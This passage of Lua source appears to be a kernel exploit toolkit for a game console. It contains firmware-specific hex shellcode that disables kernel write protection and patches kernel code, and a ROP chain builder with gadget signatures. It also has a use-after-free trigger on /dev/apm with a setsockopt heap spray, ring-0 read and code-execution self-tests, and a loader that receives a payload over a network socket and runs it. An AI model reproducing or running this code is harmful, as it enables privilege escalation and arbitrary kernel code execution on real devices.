          .. "00c6811456120000c7811b561200498bb7206689b91f561200c6812156120000"
          .. "c78133561200498dbfc06644898137561200c6813956120000c7813f56120049"
          .. "8dbfe06644898943561200c6814556120000c78152561200498dbf0066448991"
          .. "56561200c6815856120000c7815e561200498dbf206644899962561200c68164"
          .. "561200006689816f561200c68171561200ff0f20c0480d000001000f22c031c0"
          .. "c3",
    ["13.00"] =
          "b9820000c00f3248c1e22089c04809c2488d8a40feffff0f20c04825fffffeff"
          .. "0f22c0b8eb040000beeb040000bf90e9ffff41b8eb000000668981e3761b00b8"
          .. "eb04000041b9eb00000041baeb0000006689814cc12f0041bbeb000000b890e9"
          .. "ffff9090909090909090904881c2f40800006689b1f3761b006689b913771b00"
          .. "66448981847b6200c681cd0a0000ebc6812dd42b00ebc68171d42b00ebc681ed"
          .. "d42b00ebc68131d52b00ebc681ddd62b00ebc6818ddb2b00ebc6815ddc2b00eb"
          .. "664489896f846200c7819004000000000000c681c2040000eb66448991b90400"
          .. "0066448999b5040000c68146153900eb668981a4711b00c78158771b0090e93c"
          .. "01c781c0d83b004831c0c3c6817aa71f0037c6817da71f0037c781802d100102"
          .. "000000488991882d1001c781ac2d1001010000000f20c0480d000001000f22c0"
          .. "0f20c04825fffffeff0f22c0b8eb480000ba040000004531c04531c9be050000"
          .. "0066898191551200b8eb060000bf05000000668981d355120041ba0100000048"
          .. "b84183bfa00400000041bb01000000488981db551200b804000000668981ed55"
          .. "1200b8498bffffc781e9551200498b87d0c681ef55120000c781f6551200498b"
          .. "b7b0668991fa551200c681fc55120000c7810e561200498b87406689b1125612"
          .. "00c6811456120000c7811b561200498bb7206689b91f561200c6812156120000"
          .. "c78133561200498dbfc06644898137561200c6813956120000c7813f56120049"
          .. "8dbfe06644898943561200c6814556120000c78152561200498dbf0066448991"
          .. "56561200c6815856120000c7815e561200498dbf206644899962561200c68164"
          .. "561200006689816f561200c68171561200ff0f20c0480d000001000f22c031c0"
          .. "c3",
    ["12.52"] =
          "b9820000c00f3248c1e22089c04809c2488d8a40feffff0f20c04825fffffeff"
          .. "0f22c0b8eb040000beeb040000bf90e9ffff41b8eb000000668981e3761b00b8"
          .. "eb04000041b9eb00000041baeb0000006689812cc12f0041bbeb000000b890e9"
          .. "ffff66c781b40a0000ff264881c2f40800006689b1f3761b006689b913771b00"
          .. "66448981347b6200c681cd0a0000ebc6810dd42b00ebc68151d42b00ebc681cd"
          .. "d42b00ebc68111d52b00ebc681bdd62b00ebc6816ddb2b00ebc6813ddc2b00eb"
          .. "664489891f846200c7819004000000000000c681c2040000eb66448991b90400"
          .. "0066448999b5040000c68126153900eb668981a4711b00c78158771b0090e93c"
          .. "01c781a0d83b004831c0c3c6815aa71f0037c6815da71f0037c781802d100102"
          .. "000000488991882d1001c781ac2d1001010000000f20c0480d000001000f22c0"
          .. "0f20c04825fffffeff0f22c0b8eb480000ba040000004531c04531c9be050000"
          .. "0066898191551200b8eb060000bf05000000668981d355120041ba0100000048"
          .. "b84183bfa00400000041bb01000000488981db551200b804000000668981ed55"
          .. "1200b8498bffffc781e9551200498b87d0c681ef55120000c781f6551200498b"
          .. "b7b0668991fa551200c681fc55120000c7810e561200498b87406689b1125612"
          .. "00c6811456120000c7811b561200498bb7206689b91f561200c6812156120000"
          .. "c78133561200498dbfc06644898137561200c6813956120000c7813f56120049"
          .. "8dbfe06644898943561200c6814556120000c78152561200498dbf0066448991"
          .. "56561200c6815856120000c7815e561200498dbf206644899962561200c68164"
          .. "561200006689816f561200c68171561200ff0f20c0480d000001000f22c031c0"
          .. "c3",
    ["12.50"] =
          "b9820000c00f3248c1e22089c04809c2488d8a40feffff0f20c04825fffffeff"
          .. "0f22c0b8eb040000beeb040000bf90e9ffff41b8eb000000668981e3761b00b8"
          .. "eb04000041b9eb00000041baeb0000006689812cc12f0041bbeb000000b890e9"
          .. "ffff66c781b40a0000ff264881c2f40800006689b1f3761b006689b913771b00"
          .. "66448981347b6200c681cd0a0000ebc6810dd42b00ebc68151d42b00ebc681cd"
          .. "d42b00ebc68111d52b00ebc681bdd62b00ebc6816ddb2b00ebc6813ddc2b00eb"
          .. "664489891f846200c7819004000000000000c681c2040000eb66448991b90400"
          .. "0066448999b5040000c68126153900eb668981a4711b00c78158771b0090e93c"
          .. "01c781a0d83b004831c0c3c6815aa71f0037c6815da71f0037c781802d100102"
          .. "000000488991882d1001c781ac2d1001010000000f20c0480d000001000f22c0"
          .. "0f20c04825fffffeff0f22c0b8eb480000ba040000004531c04531c9be050000"
          .. "0066898191551200b8eb060000bf05000000668981d355120041ba0100000048"
          .. "b84183bfa00400000041bb01000000488981db551200b804000000668981ed55"
          .. "1200b8498bffffc781e9551200498b87d0c681ef55120000c781f6551200498b"
          .. "b7b0668991fa551200c681fc55120000c7810e561200498b87406689b1125612"
          .. "00c6811456120000c7811b561200498bb7206689b91f561200c6812156120000"
          .. "c78133561200498dbfc06644898137561200c6813956120000c7813f56120049"
          .. "8dbfe06644898943561200c6814556120000c78152561200498dbf0066448991"
          .. "56561200c6815856120000c7815e561200498dbf206644899962561200c68164"
          .. "561200006689816f561200c68171561200ff0f20c0480d000001000f22c031c0"
          .. "c3",
    ["12.02"] =
          "b9820000c00f3248c1e22089c04809c2488d8a40feffff0f20c04825fffffeff"
          .. "0f22c0b8eb040000beeb040000bf90e9ffff41b8eb000000668981a3761b00b8"
          .. "eb04000041b9eb00000041baeb000000668981ecc02f0041bbeb000000b890e9"
          .. "ffff66c781b40a0000ff264881c2f40800006689b1b3761b006689b9d3761b00"
          .. "66448981f47a6200c681cd0a0000ebc681cdd32b00ebc68111d42b00ebc6818d"
          .. "d42b00ebc681d1d42b00ebc6817dd62b00ebc6812ddb2b00ebc681fddb2b00eb"
          .. "66448989df836200c7819004000000000000c681c2040000eb66448991b90400"
          .. "0066448999b5040000c681e6143900eb66898164711b00c78118771b0090e93c"
          .. "01c78160d83b004831c0c3c6811aa71f0037c6811da71f0037c781802d100102"
          .. "000000488991882d1001c781ac2d1001010000000f20c0480d000001000f22c0"
          .. "0f20c04825fffffeff0f22c0b8eb480000ba040000004531c04531c9be050000"
          .. "0066898151551200b8eb060000bf050000006689819355120041ba0100000048"
          .. "b84183bfa00400000041bb010000004889819b551200b804000000668981ad55"
          .. "1200b8498bffffc781a9551200498b87d0c681af55120000c781b6551200498b"
          .. "b7b0668991ba551200c681bc55120000c781ce551200498b87406689b1d25512"
          .. "00c681d455120000c781db551200498bb7206689b9df551200c681e155120000"
          .. "c781f3551200498dbfc066448981f7551200c681f955120000c781ff55120049"
          .. "8dbfe06644898903561200c6810556120000c78112561200498dbf0066448991"
          .. "16561200c6811856120000c7811e561200498dbf206644899922561200c68124"
          .. "561200006689812f561200c68131561200ff0f20c0480d000001000f22c031c0"
          .. "c3",
    ["12.00"] =
          "b9820000c00f3248c1e22089c04809c2488d8a40feffff0f20c04825fffffeff"
          .. "0f22c0b8eb040000beeb040000bf90e9ffff41b8eb000000668981a3761b00b8"
          .. "eb04000041b9eb00000041baeb000000668981ecc02f0041bbeb000000b890e9"
          .. "ffff66c781b40a0000ff264881c2f40800006689b1b3761b006689b9d3761b00"
          .. "66448981f47a6200c681cd0a0000ebc681cdd32b00ebc68111d42b00ebc6818d"
          .. "d42b00ebc681d1d42b00ebc6817dd62b00ebc6812ddb2b00ebc681fddb2b00eb"
          .. "66448989df836200c7819004000000000000c681c2040000eb66448991b90400"
          .. "0066448999b5040000c681e6143900eb66898164711b00c78118771b0090e93c"
          .. "01c78160d83b004831c0c3c6811aa71f0037c6811da71f0037c781802d100102"
          .. "000000488991882d1001c781ac2d1001010000000f20c0480d000001000f22c0"
          .. "0f20c04825fffffeff0f22c0b8eb480000ba040000004531c04531c9be050000"
          .. "0066898151551200b8eb060000bf050000006689819355120041ba0100000048"
          .. "b84183bfa00400000041bb010000004889819b551200b804000000668981ad55"
          .. "1200b8498bffffc781a9551200498b87d0c681af55120000c781b6551200498b"
          .. "b7b0668991ba551200c681bc55120000c781ce551200498b87406689b1d25512"
          .. "00c681d455120000c781db551200498bb7206689b9df551200c681e155120000"
          .. "c781f3551200498dbfc066448981f7551200c681f955120000c781ff55120049"
          .. "8dbfe06644898903561200c6810556120000c78112561200498dbf0066448991"
          .. "16561200c6811856120000c7811e561200498dbf206644899922561200c68124"
          .. "561200006689812f561200c68131561200ff0f20c0480d000001000f22c031c0"
          .. "c3",
}

local POP_OPCODES = { rdi = 0x5f, rsi = 0x5e, rdx = 0x5a, rcx = 0x59 }

local ADD_FORMS = {
    { "4801f8", "rdi" }, { "4801f0", "rsi" }, { "4801c8", "rcx" },
    { "4803c7", "rdi" }, { "4803c6", "rsi" }, { "4803c1", "rcx" },
    { "488d0438", "rdi" }, { "488d0430", "rsi" }, { "488d0408", "rcx" },
}
local SUB_FORMS = {
    { "4829f8", "rdi" }, { "4829f0", "rsi" }, { "4829c8", "rcx" },
}

local PIVOT_FORMS = {
    { "488b67", 1, "deref" },
    { "488ba7", 4, "deref" },
    { "488b27", 0, "deref" },
    { "488d67", 1, "frame" },
    { "488da7", 4, "frame" },
    { "488d27", 0, "frame" },
    { "4889fc", 0, "frame" },
    { "4887fc", 0, "frame" },
    { "4887e7", 0, "frame" },
    { "575c",   0, "frame" },
}

local RDX_SETTER_FORMS = {
    { "4889ca", "rcx" },
    { "4889f2", "rsi" },
    { "4889c2", "rax" },
    { "4889fa", "rdi" },
}

local LEAK_FORMS = {
    { "488927", 0, "rsp" }, { "488967", 1, "rsp" },
    { "48892f", 0, "rbp" }, { "48896f", 1, "rbp" },
    { "4c8927", 0, "r12" }, { "4c8967", 1, "r12" },
    { "4c892f", 0, "r13" }, { "4c896f", 1, "r13" },
    { "4c8937", 0, "r14" }, { "4c8977", 1, "r14" },
    { "4c893f", 0, "r15" }, { "4c897f", 1, "r15" },
}

local PLAIN_GADGETS = {
    store = "488907c3",
    load  = "488b07c3",
    shr   = "48d3e8c3",
    shl   = "48d3e0c3",
    leave = "c9c3",
}

local ROOM_SIZE = 0x1000

-- libc's first page holds the ELF header: readable, not executable.
-- A gadget there faults on instruction fetch, so every accepted offset
-- sits past it.
local MIN_GADGET_OFF = 0x1000
AG.padding = nil
AG.room = nil

function AG.code_at(page_at, off)
    local c = { at = U(page_at) + off, n = 0 }

    function c:reset() self.n = 0; return self end

    function c:byte(b)
        AG.wr1(self.at + self.n, b % 256)
        self.n = self.n + 1
        return self
    end

    function c:hex(s)
        local bin = hex_to_binary((s:gsub("%s+", "")))
        AG.wrbuf(self.at + self.n, bin)
        self.n = self.n + #bin
        return self
    end

    function c:dw(n)
        n = math.floor(n) % 2^32
        for k = 0, 3 do
            self:byte(math.floor(n / 2^(8*k)) % 256)
        end
        return self
    end

    function c:qw(q)
        AG.wr8(self.at + self.n, uint64(q))
        self.n = self.n + 8
        return self
    end

    function c:imm(str)
        AG.wrbuf(self.at + self.n, str)
        self.n = self.n + #str
        return self
    end

    return c
end

function AG.new_chain(buf_at, gad, size)
    local c = { buf = U(buf_at), base = U(buf_at), n = 0, fix = {}, g = gad,
                pops = AG.pops or {}, limit = size or 0 }

    function c:slot(q)

        if self.limit > 0 and (self.n + 1) * 8 > self.limit then
            error(string.format("chain overflow: slot %d into a %d byte buffer",
                self.n + 1, self.limit))
        end
        memory.write_qword(self.buf + self.n * 8, uint64(q))
        self.n = self.n + 1
        return self.n - 1
    end

    function c:num(n) return self:slot(uint64(n)) end
    function c:hole() return self:slot(uint64(0)) end
    function c:where(i) return self.base + i * 8 end
    function c:gad(name) return self:slot(self.g[name]) end
    function c:point(h, target) table.insert(self.fix, { h, target }) end

    for _ = 1, ((AG.pops or {}).pivot or 0) do c:num(0) end

    function c:seal()
        if AG.cfg and AG.cfg.debug then
            log("    chain %d slots, %d bytes", self.n, self.n * 8)
        end
        for _, f in ipairs(self.fix) do
            memory.write_qword(self.buf + f[1] * 8, self:where(f[2]))
        end
        self:gad("leave")
    end

    function c:reg(name, value)
        self:gad(name)
        local slot = self:num(value)
        for _ = 1, (self.pops[name] or 0) do self:num(0) end
        return slot
    end

    function c:rdi(n) return self:reg("rdi", n) end
    function c:rsi(n) return self:reg("rsi", n) end
    function c:rdx(n)
        if self.g.rdx then return self:reg("rdx", n) end
        if not self.g.rdx_set then error("rdx: neither a pop nor a setter") end
        self:reg(AG.rdx_source, n)
        self:gad("rdx_set")
        for _ = 1, (self.pops.rdx_set or 0) do self:num(0) end
    end
    function c:rcx(n) return self:reg("rcx", n) end

    function c:reg_hole(name)
        self:gad(name)
        local slot = self:hole()
        for _ = 1, (self.pops[name] or 0) do self:num(0) end
        return slot
    end

    function c:follow(off)
        if off ~= 0 then
            local reg = AG.math_reg
            if not reg then error("follow: no add/sub gadget") end
            if AG.math_is_add then
                self:reg(reg, off)
                self:gad("add")
            else
                self:reg(reg, uint64(0) - uint64(off))
                self:gad("sub")
            end
        end
        if AG.rax_deref == "self_load" then
            self:gad_tail("self_load")
        else
            self:slot(self.g[AG.mov_to_rdi])
            self:gad("load")
        end
    end

    c.follow_rax = c.follow

    function c:save_rax(at) self:rdi(at); self:gad("store") end
    function c:load_rax(at) self:rdi(at); self:gad("load") end

    -- Ring 0 must not call into libc: memcpy uses SSE while the kernel runs
    -- with CR0.TS set, which is a #NM panic. Copy with mov/pop/add only.
    -- The source pointer is parked in its own qword, never in a chain slot:
    -- a slot in the instruction stream would be executed as an address.
    function c:copy_from_rax(dst, len)
        local n = math.floor(len / 8)

        local save = AG.alloc(8)
        AG.zero(save, 8)
        self:rdi(save)
        self:gad("store")
        local mover = AG.rax_deref == "self_load" and nil or self.g[AG.mov_to_rdi]
        for i = 0, n - 1 do
            self:rdi(save)
            self:gad("load")
            if i > 0 then
                self:rcx(i * 8)
                self:gad("add")
            end
            if AG.rax_deref == "self_load" then
                self:gad_tail("self_load")
            else
                self:slot(mover)
                for _ = 1, (self.pops[AG.mov_to_rdi] or 0) do self:num(0) end
                self:gad("load")
            end
            self:rdi(dst + i * 8)
            self:gad("store")
        end
        return save
    end

    function c:gad_tail(name)
        self:gad(name)
        for _ = 1, (self.pops[name] or 0) do self:num(0) end
    end

    function c:put_const(dst, value)
        self:rdi(dst)
        self:reg("rax", value)
        self:gad("store")
    end

    function c:put_dword(dst, value)
        if not self.g.store_dword then error("put_dword: no mov [rdi],eax gadget") end
        self:rdi(dst)
        self:reg("rax", value)
        self:gad_tail("store_dword")
    end

    function c:grab(dst, len)
        return self:copy_from_rax(dst, len)
    end

    function c:put(dst, src, len)
        for i = 0, math.floor(len / 8) - 1 do
            self:rdi(src + i * 8); self:gad("load")
            self:rdi(dst + i * 8); self:gad("store")
        end
    end

    return c
end

local STATE = { units = {}, clones = 0, base = nil, retry = false, shots = 0 }

local function shooter(gad)
    local s = {
        g = gad, fired = 0, sprayed = 0, why = nil, window = 0,
        devs = {}, queues = {}, sockaddr = AG.alloc(16),
    }

    local bs = { 16, 2, 0x04, 0xD2, 0x0a, 0, 0, 1 }
    for i = 0, 7 do AG.wr1(s.sockaddr + i, bs[i + 1]) end

    local function hold(path)
        local fd = i32(syscall.open(path, 0))
        if fd >= 0 then table.insert(s.devs, fd) end
        return fd
    end
    s.hold = hold

    function s:take(build, room, direct)
        self.why = nil

        if hold("/dev/apm") < 0 then
            self.why = "the clone node refused to open, errno " .. errno_str()
            return nil
        end

        local unit, watched = -1, -1
        local refused = {}
        for u = TUNE.ceiling, 0, -1 do
            if not STATE.units[u] then
                local fd = hold("/dev/apm" .. u)
                if fd >= 0 then unit, watched = u, fd; break end
                if #refused < 4 then
                    table.insert(refused, u .. ":e" .. errno_str())
                end
            end
        end
        if unit < 0 then
            local spent = 0
            for _ in pairs(STATE.units) do spent = spent + 1 end
            self.why = string.format("no apm unit among 0..%d (%d spent, refusals %s)",
                TUNE.ceiling, spent, table.concat(refused, " "))
            return nil
        end
        STATE.units[unit] = true
        self.fired = self.fired + 1
        STATE.shots = STATE.shots + 1

        local doomed = i32(syscall.open("/dev/apm" .. unit, 0))
        if doomed < 0 then
            self.why = "second open of /dev/apm" .. unit .. " refused, errno " .. errno_str()
            return nil
        end

        local q = i32(syscall.kqueue())
        if q < 0 then
            self.why = "kqueue() refused, errno " .. errno_str()
            return nil
        end
        table.insert(self.queues, q)

        local ev = AG.alloc(32)
        local function arm()
            AG.wr4(ev + 0, watched)
            AG.wr4(ev + 4, 0)
            memory.write_word(ev + 8, 0xFFFF)
            memory.write_word(ev + 10, 0x0001)
            AG.wr4(ev + 12, 0)
            AG.zero(ev + 16, 16)
            return i32(syscall.kevent(q, ev, 1, 0, 0, 0))
        end

        local armed = arm()
        if armed ~= 0 then
            self.why = string.format("kevent would not arm on unit %d, rv=%d errno %s",
                unit, armed, errno_str())
            return nil
        end

        local room_size = room or 0x400
        local SLACK = 0x100
        local disp = AG.pivot_frame_off or 0
        local mode = AG.pivot_mode

        local scratch = AG.alloc(room_size)
        local frame_size = SLACK + math.max(0x100, room_size) + 0x900
        local fbase = AG.alloc(frame_size)
        local frame = fbase + SLACK
        AG.zero(fbase, frame_size)

        local body = AG.alloc(TUNE.object)
        AG.zero(body, TUNE.object)

        if direct then
            AG.wr8(body + 0x38, direct.fn)
            AG.wr8(body + 0x58, direct.arg)
        elseif mode == "restore" then

            local chain_at = scratch + 0x10
            local c = AG.new_chain(chain_at, self.g, room_size - 0x20)
            build(c)
            c:seal()
            AG.wr8(frame + AG.pivot_rip_disp, AG.ret_gadget)
            AG.wr8(frame + AG.pivot_rsp_disp, chain_at)
            AG.wr8(body + 0x38, self.g.pivot)
            AG.wr8(body + 0x58, frame)
        elseif mode == "jmp" then
            local c = AG.new_chain(scratch, self.g, room_size - 0x20)
            build(c)
            c:seal()

            AG.wr8(AG.jmpbuf + 0x00, AG.ret_gadget)
            AG.wr8(AG.jmpbuf + 0x10, scratch)
            AG.wr8(body + 0x38, AG.longjmp_addr)
            AG.wr8(body + 0x58, AG.jmpbuf)
        else
            local chain_at = scratch
            if mode == "frame" then chain_at = frame + disp end

            local c = AG.new_chain(chain_at, self.g, room_size - 0x20)
            build(c)
            c:seal()
            if mode ~= "frame" then
                AG.wr8(frame + disp, chain_at)
            end
            AG.wr8(body + 0x38, self.g.pivot)
            AG.wr8(body + 0x58, frame)
        end

        local req = AG.alloc(40)
        AG.wr4(req + 0, 1)
        AG.wr4(req + 4, 0)
        AG.wr8(req + 8, self.sockaddr)
        AG.wr4(req + 16, 16)
        AG.wr8(req + 24, body)
        AG.wr4(req + 32, TUNE.object)

        for _ = 1, TUNE.seed do
            if hold("/dev/apm") < 0 then break end
            STATE.clones = STATE.clones + 1
        end

        local socks = {}
        for _ = 1, TUNE.sprays do
            local fd = i32(syscall.socket(2, 2, 0))
            if fd < 0 then break end
            table.insert(socks, fd)
        end

        local drain = (TUNE.spray_mode == "drain")
        local refill = {}
        if drain then
            for _ = 1, (TUNE.refill or 8) do
                local fd = i32(syscall.socket(2, 2, 0))
                if fd < 0 then break end
                table.insert(refill, fd)
            end
            for i = 1, #socks do
                syscall.setsockopt(socks[i], 17, 128, req, 40)
            end
        end

        local t0 = now_ms()
        collectgarbage("stop")
        syscall.close(doomed)
        if drain then
            for i = 1, #refill do
                syscall.setsockopt(refill[i], 17, 128, req, 40)
            end
        else
            for i = 1, #socks do
                syscall.setsockopt(socks[i], 17, 128, req, 40)
            end
        end
        collectgarbage("restart")
        local t1 = now_ms()
        self.window = t1 - t0

        for _ = 1, TUNE.spare do hold("/dev/apm") end

        self.sprayed = drain and #refill or #socks
        local r = arm()
        for i = 1, #socks do syscall.close(socks[i]) end
        for i = 1, #refill do syscall.close(refill[i]) end

        log("    window %.2f ms for %d setsockopt (mode %s, drained %d)",
            self.window, self.sprayed, tostring(TUNE.spray_mode), #socks)
        return r
    end

    return s
end

local function ran(r) return r ~= nil and r == -1 end

local GATE      = 0x0a0
local BODY      = 0x0c0
local OUT       = 0x400
local FLAG      = 0x420
local STAGE     = 0x440
local STAGE_MAX = 0x400
local SIGIL     = 0x600D600D

-- After a run the room page is kernel-only, so user mode can neither read
-- nor execute anything there. Stages keep their gate stub, body and result
-- cells in a fresh rwx page of their own.
function AG.user_stage()
    local at = U(syscall.mmap(0, 0x2000, 7, 0x1002, -1, 0))
    if at.l == 0 or (at.h ~= 0 and at.h >= 0xffff0000) then
        warn("stage: mmap rwx failed")
        return nil
    end
    log("stage: %s..%s rwx", hexaddr(at), hexaddr(at + 0x2000))
    return AG.open_ring0(at)
end

function AG.gate_selftest()
    local libc = AG.find_libc()
    if not libc then warn("gate: no libc"); return false end
    AG.resolve_gadgets(libc.base)
    local r = AG.user_stage()
    if not r then return false end

    local base = r.base()
    log("gate: stage %s, body at %s", hexaddr(r.at), hexaddr(r.body_at))
    if not base then
        warn("gate: rdmsr body did not run -- sysent[11] is not the gate any more")
        return false
    end
    log("gate: rdmsr LSTAR - 0x1c0 = %s  (kernel text)", hexaddr(base))

    local c = r.begin()
    c:hex("48b8"):qw(base)
    c:hex("488b00")
    c:hex("48ba"):qw(r.at + OUT)
    c:hex("488902")
    if r.run() then
        log("gate: *(kernel base) = %s", hexaddr(r.out()))
        log("gate: ring 0 confirmed -- privileged instruction and kernel read both worked")
        return true
    end
    warn("gate: kernel read body did not run")
    return false
end

function AG.kexec_selftest()
    local libc = AG.find_libc()
    if not libc then warn("kexec: no libc"); return false end
    AG.resolve_gadgets(libc.base)
    local r = AG.user_stage()
    if not r then return false end
    AG.wr4(r.at + FLAG, 0)

    local code_at = U(syscall.mmap(0, 0x1000, 7, 0x1002, -1, 0))
    if code_at.l == 0 or code_at.h ~= 0 and code_at.h >= 0xffff0000 then
        warn("kexec: mmap failed"); return false
    end
    log("kexec: mapped %s..%s rwx", hexaddr(code_at), hexaddr(code_at + 0x1000))

    local payload = AG.code_at(code_at, 0)
    payload:hex("48b8"):qw(r.at + FLAG)
    payload:hex("c700"):dw(SIGIL)
    payload:hex("31c0"):hex("c3")

    local body = r.begin()
    body:hex("48b8"):qw(code_at)
    body:hex("ffd0")
    body:hex("31c0"):hex("c3")
    if r.run() and AG.rd4(r.at + FLAG) % 2^32 == SIGIL then
        log("kexec: ring 0 executed code from a fresh rwx page -- primitive works")
        return true
    end
    warn("kexec: the payload page did not run")
    return false
end

local function le16(n) return string.char(n % 256, math.floor(n / 256) % 256) end
local function le32(n)
    return string.char(n % 256, math.floor(n / 256) % 256,
                       math.floor(n / 65536) % 256, math.floor(n / 16777216) % 256)
end
local function le64(v)
    return le32(v % 4294967296) .. le32(math.floor(v / 4294967296) % 4294967296)
end

local function leU(u) return le32(u.l) .. le32(u.h) end
local function fromhex(h)
    return (h:gsub("%x%x", function(cc) return string.char(tonumber(cc, 16)) end))
end
AG.le16, AG.le32, AG.le64, AG.leU, AG.fromhex = le16, le32, le64, leU, fromhex

local function rd_u16(d, o) local a, b = d:byte(o + 1, o + 2); return a + b * 256 end
local function rd_u32(d, o)
    local a, b, c, e = d:byte(o + 1, o + 4)
    return a + b * 256 + c * 65536 + e * 16777216
end
local function rd_u64(d, o) return rd_u32(d, o) + rd_u32(d, o + 4) * 4294967296 end

function AG.load_elf(src)
    local data, label
    if type(src) == "string" and src:sub(1, 4) == "\127ELF" then
        data, label = src, "<memory>"
    else
        local f = io.open(tostring(src), "rb")
        if not f then return nil, "cannot open " .. tostring(src) end
        data, label = f:read("*a"), tostring(src)
        f:close()
    end
    if type(data) ~= "string" or #data < 64 or data:sub(1, 4) ~= "\127ELF" then
        return nil, "not an ELF64 file"
    end
    local entry  = rd_u64(data, 0x18)
    local phoff  = rd_u64(data, 0x20)
    local phent  = rd_u16(data, 0x36)
    local phnum  = rd_u16(data, 0x38)
    log("elf: %s  entry=0x%x phoff=0x%x phnum=%d machine=%d",
        label, entry, phoff, phnum, rd_u16(data, 0x12))

    local segs = {}
    for i = 0, phnum - 1 do
        local o = phoff + i * phent
        if rd_u32(data, o) == 1 then
            segs[#segs + 1] = {
                off = rd_u64(data, o + 0x08),
                vaddr = rd_u64(data, o + 0x10),
                filesz = rd_u64(data, o + 0x20),
                memsz = rd_u64(data, o + 0x28),
                flags = rd_u32(data, o + 0x04),
            }
        end
    end
    if #segs == 0 then return nil, "no PT_LOAD segments" end

    local lo, hi = nil, 0
    for _, g in ipairs(segs) do
        if not lo or g.vaddr < lo then lo = g.vaddr end
        if g.vaddr + g.memsz > hi then hi = g.vaddr + g.memsz end
    end
    local span = math.floor((hi - lo + 0xfff) / 0x1000) * 0x1000
    local at, how
    if lo ~= 0 then

        local want = math.floor(lo / 0x1000) * 0x1000
        at = U(syscall.mmap(want, span, 7, 0x1002 + 0x10, -1, 0))
        if at.l == 0 or at.h ~= 0 then
            log("elf: fixed mapping at 0x%x refused, loading anywhere", want)
            at = U(syscall.mmap(0, span, 7, 0x1002, -1, 0))
            how = "anywhere"
        else
            how = "fixed"
        end
    else
        at = U(syscall.mmap(0, span, 7, 0x1002, -1, 0))
        how = "anywhere"
    end
    if at.l == 0 or (at.h ~= 0 and at.h >= 0xffff0000) then
        return nil, "mmap failed"
    end
    log("elf: %d segment(s), image 0x%x bytes at %s (%s)", #segs, span, hexaddr(at), how)

    for _, g in ipairs(segs) do
        local dst = at + (g.vaddr - lo)
        local body_bytes = data:sub(g.off + 1, g.off + g.filesz)
        AG.wrbuf(dst, body_bytes)
        log("elf:   load 0x%x bytes -> %s (flags %d)", g.filesz, hexaddr(dst), g.flags)
    end
    return at + (entry - lo)
end

local B64 = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"

function AG.a85decode(s, want)
    local out, acc, k = {}, 0, 0
    for i = 1, #s do
        local c = s:byte(i)
        if c and c >= 33 and c <= 117 then
            acc = acc * 85 + (c - 33)
            k = k + 1
            if k == 5 then
                out[#out + 1] = string.char(
                    math.floor(acc / 16777216) % 256,
                    math.floor(acc / 65536) % 256,
                    math.floor(acc / 256) % 256,
                    acc % 256)
                acc, k = 0, 0
            end
        end
    end
    if k > 0 then
        for _ = k, 4 do acc = acc * 85 + 84 end
        local b = {
            math.floor(acc / 16777216) % 256,
            math.floor(acc / 65536) % 256,
            math.floor(acc / 256) % 256,
            acc % 256,
        }
        for j = 1, k - 1 do out[#out + 1] = string.char(b[j]) end
    end
    local r = table.concat(out)
    if want and #r > want then r = r:sub(1, want) end
    return r
end

function AG.b64decode(s)
    local out, buf, bits = {}, 0, 0
    s = s:gsub("[^%w%+/=]", "")
    for i = 1, #s do
        local c = s:sub(i, i)
        if c == "=" then break end
        local v = B64:find(c, 1, true)
        if v then
            buf = (buf * 64 + (v - 1)) % 4294967296
            bits = bits + 6
            if bits >= 8 then
                bits = bits - 8
                local byte = math.floor(buf / 2^bits) % 256
                out[#out + 1] = string.char(byte)
            end
        end
    end
    return table.concat(out)
end

-- goldhen.bin inspects its caller's return address. Called from a user
-- thread it takes its own path -- syscall 11 with its main as arg0 -- and
-- the gate already means exactly that, so the gate bytes stay untouched.
-- Called from ring 0 it installs inline and expects a context we do not
-- have, so a thread it is.
function AG.goldhen_install(port)
    if not AG.need_syscalls({"socket", "bind", "listen", "accept", "read", "close", "setsockopt"}) then return false end
    local port = port or AG.cfg.listen_port or 9020
    local max = AG.cfg.listen_max or 0x100000

    local libc = AG.find_libc()
    if not libc then warn("gh: no libc"); return false end
    AG.resolve_gadgets(libc.base)
    local r = AG.user_stage()
    if not r then return false end
    local kbase = r.base()
    if not kbase then warn("gh: no kernel base"); return false end
    log("gh: kernel base %s", hexaddr(kbase))

    local image = U(syscall.mmap(0, max, 7, 0x1002, -1, 0))
    if image.l == 0 or (image.h ~= 0 and image.h >= 0xffff0000) then
        warn("gh: mmap for the image failed"); return false
    end

    local fd = i32(syscall.socket(2, 1, 0))
    if fd < 0 then warn("gh: socket failed"); return false end
    local one = AG.alloc(4); AG.wr4(one, 1)
    syscall.setsockopt(fd, 0xffff, 0x0004, one, 4)
    local sa = AG.alloc(16); AG.zero(sa, 16)
    AG.wr1(sa, 16); AG.wr1(sa + 1, 2)
    AG.wr1(sa + 2, math.floor(port / 256) % 256); AG.wr1(sa + 3, port % 256)
    local alen = AG.alloc(8); AG.wr4(alen, 16)
    if i32(syscall.bind(fd, sa, 16)) < 0 then
        warn("gh: bind %d failed: %s", port, tostring(get_error_string and get_error_string() or "?"))
        return false
    end
    syscall.listen(fd, 3)
    log("gh: waiting for the payload on port %d, image page %s", port, hexaddr(image))

    local cfd = i32(syscall.accept(fd, sa, alen))
    if cfd < 0 then warn("gh: accept failed"); return false end
    local got = 0
    while got < max do
        local n = i32(syscall.read(cfd, image + got, math.min(0x10000, max - got)))
        if n <= 0 then break end
        got = got + n
    end
    syscall.close(cfd); syscall.close(fd)
    log("gh: received %d bytes", got)
    if got < 0x1000 then warn("gh: payload too small"); return false end

    if AG.cfg.patch_gate then
        local gate = U(kbase) + (AG.cfg.gate_off or 0xab4)
        log("gh: patching the gate at %s (only if the semantics differ)", hexaddr(gate))
        local patch = AG.alloc(0x10)
        AG.wr1(patch, 0xff); AG.wr1(patch + 1, 0xe6)
        if not r.copy(gate, patch, 2, true) then
            warn("gh: gate patch failed"); return false
        end
    end

    log("gh: starting the payload in a user thread at %s", hexaddr(image))
    local Thrd_create = fcall(libc_addrofs and libc_addrofs.Thrd_create)
    if not Thrd_create then warn("gh: no Thrd_create in this libc"); return false end
    local handle = AG.alloc(8)
    local rv = i32(Thrd_create(handle, image, 0))
    log("gh: Thrd_create -> %d", rv)
    if rv ~= 0 then warn("gh: thread did not start"); return false end
    local Thrd_join = fcall(libc_addrofs.Thrd_join)
    if Thrd_join then
        Thrd_join(AG.rd8(handle), 0)
        log("gh: the payload thread exited")
    end
    return true
end

-- Payload over a socket rather than inside this file: the loader caps Lua
